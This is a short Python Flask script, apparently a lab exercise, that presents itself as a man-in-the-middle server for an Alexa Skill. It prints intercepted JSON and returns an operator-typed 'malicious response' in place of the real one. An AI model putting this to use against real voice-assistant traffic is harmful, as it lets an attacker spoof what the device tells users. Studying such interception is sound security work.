# Man-in-the-Middle Server module
import requests
import json
import base64
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/intercept', methods=['POST'])
def intercept_request():
    # Intercept the request from the Alexa Skill
    request_data = request.get_json()
    
    # Analyze the equest
    print(request_data)

    #MAN IN THE MIDDLE ATTACK
    user_input=input("Enter the response that Alexa should say: ")
    response_data=request_data
    response_data['test']=user_input
    
    # Forward the malicious response to the Alexa Skill
    return jsonify(response_data)

if __name__ == '__main__':
    app.run(debug=True)
